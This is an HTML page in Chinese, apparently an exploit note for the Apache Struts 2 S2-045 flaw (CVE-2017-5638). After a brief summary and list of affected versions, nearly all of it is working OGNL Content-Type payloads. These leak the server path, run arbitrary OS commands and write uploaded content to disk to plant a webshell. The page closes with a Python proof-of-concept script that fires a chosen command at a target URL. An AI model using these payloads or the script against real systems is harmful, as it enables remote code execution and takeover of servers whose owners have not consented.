<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2017-5638s2-045"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2017-5638</span><span class="csECDA2D3">）</span><span class="csDE05BCC">S2-045</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Struts</span><span class="cs9C1B1871">使用的</span><span class="cs8926E06">Jakarta</span><span class="cs9C1B1871">解析文件上传请求包不当，当远程攻击者构造恶意的</span><span class="cs8926E06">Content-Type</span><span class="cs9C1B1871">，可能导致远程命令执行。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">实际上在</span><span class="cs8926E06">default.properties</span><span class="cs9C1B1871">文件中，</span><span class="cs8926E06">struts.multipart.parser</span><span class="cs9C1B1871">的值有两个选择，分别是</span><span class="cs8926E06">jakarta</span><span class="cs9C1B1871">和</span><span class="cs8926E06">pell</span><span class="cs9C1B1871">（另外原本其实也有第三种选择</span><span class="cs8926E06">cos</span><span class="cs9C1B1871">）。其中的</span><span class="cs8926E06">jakarta</span><span class="cs9C1B1871">解析器是</span><span class="cs8926E06">Struts 2</span><span class="cs9C1B1871">框架的标准组成部分。默认情况下</span><span class="cs8926E06">jakarta</span><span class="cs9C1B1871">是启用的，所以该漏洞的严重性需要得到正视。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Struts 2.3.5 &ndash; Struts 2.3.31</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Struts 2.5 &ndash; Struts 2.5.10</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="获取web相关信息exp"><span class="csD6CA00D2">获取</span><span class="csD1E291E2">web</span><span class="csD6CA00D2">相关信息</span><span class="csD1E291E2">exp</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">自己构造版本</span><span class="cs8926E06"> </span><span class="cs9C1B1871">优化前（并不适用</span><span class="cs8926E06">2.5.10</span><span class="cs9C1B1871">，但执行一次优化版本后就适用了）：</span></p><p class="cs3A447A38"><span class="cs9FB05234">%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#wmres=#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;]).(#wmres.getWriter().print(&quot;S2-045 dir--***&quot;)).(#wmreq=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;)).(#wmres.getWriter().println(#wmreq.getSession().getServletContext().getRealPath(&quot;/&quot;))).(#wmres.getWriter().flush()).(#wmres.getWriter().close())}.multipart/form-data</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">自己构造版本</span><span class="cs8926E06"> </span><span class="cs9C1B1871">优化后（遇到个</span><span class="cs8926E06">xxxx </span><span class="cs9C1B1871">貌似不适用。我擦）：</span></p><p class="cs3A447A38"><span class="cs9FB05234">%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#_memberAccess))).(#wmres=#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;]).(#wmres.getWriter().print(&quot;S2-045 dir--***&quot;)).(#wmreq=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;)).(#wmres.getWriter().println(#wmreq.getSession().getServletContext().getRealPath(&quot;/&quot;))).(#wmres.getWriter().flush()).(#wmres.getWriter().close())}.multipart/form-data</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">网上别人的版本</span></p><p class="cs3A447A38"><span class="cs9FB05234">%{(#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;).getSession().getServletContext().getRealPath(&#39;/&#39;)).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.write(#path.getBytes())).(#ros.flush())}.multipart/form-data</span></p><h3 class="cs868C439D">
			<a name="执行命令"><span class="csD6CA00D2">执行命令</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">网上公开修改版本：</span></p><p class="cs3A447A38"><span class="cs9FB05234">%{(#wm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#wm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#wm)))).(#cmd=&#39;whoami&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.multipart/form-data</span></p><h3 class="cs868C439D">
			<a name="上传文件getshell"><span class="csD6CA00D2">上传文件</span><span class="csD1E291E2">getshell</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">自己构造版本（并不适用</span><span class="cs8926E06">2.5.10</span><span class="cs9C1B1871">）：</span></p><p class="cs3A447A38"><span class="cs9FB05234">%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#res=#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;]).(#res.getWriter().print(&quot;OK&quot;)).(#req=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;)).(#res.getWriter().flush()).(#res.getWriter().close()).(new java.io.BufferedWriter(new java.io.FileWriter(&quot;/1111/&quot;)).append(new java.net.URLDecoder().decode(&quot;shell&quot;,&#39;UTF-8&#39;)).close())}.multipart/form-data</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">实用度高的版本无限制长度</span><span class="cs8926E06">getshell</span><span class="cs9C1B1871">版本（并不适用</span><span class="cs8926E06">2.5.10</span><span class="cs9C1B1871">）</span></p><p class="cs3A447A38"><span class="cs9FB05234">%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#req=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;)).(#bf=new java.io.BufferedWriter(new java.io.FileWriter(&quot;C:\\1.txt&quot;))).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),#bf)).(#bf.flush()).(#bf.close()).(#res=#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;]).(#res.getWriter().print(&quot;OK&quot;)).(#res.getWriter().flush()).(#res.getWriter().close())}.multipart/form-data</span></p><h3 class="cs868C439D">
			<a name="X8d2e5407c6ca3c30f5f222541a0094772a61f93"><span class="csD6CA00D2">注意：无限制长度版本是因为</span><span class="csD1E291E2">Content-Type</span><span class="csD6CA00D2">长度有限，它将</span><span class="csD1E291E2">post</span><span class="csD6CA00D2">数据包里面所有的数据都写进指定路径文件里面。</span></a></h3>
		<h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">#! /usr/bin/env python</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># encoding:utf-8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import urllib2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from poster.encode import multipart_encode</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from poster.streaminghttp import register_openers</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">def poc():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if len(sys.argv) &lt; 3:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &#39;&#39;&#39;Usage: poc.py http://www.0-sec.org/example/HelloWorld.action &quot;command&quot;&#39;&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;register_openers()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;datagen, header = multipart_encode({&quot;image&quot;: open(&quot;tmp.txt&quot;, &quot;w+&quot;)})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;header[&quot;User-Agent&quot;]=&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;header[&quot;Content-Type&quot;]=&quot;%{(#nike=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;&quot;+str(sys.argv[2])+&quot;&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;request = urllib2.Request(str(sys.argv[1]),datagen,headers=header)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;response = urllib2.urlopen(request)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print response.read()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">poc()</span></p></body>
</html>
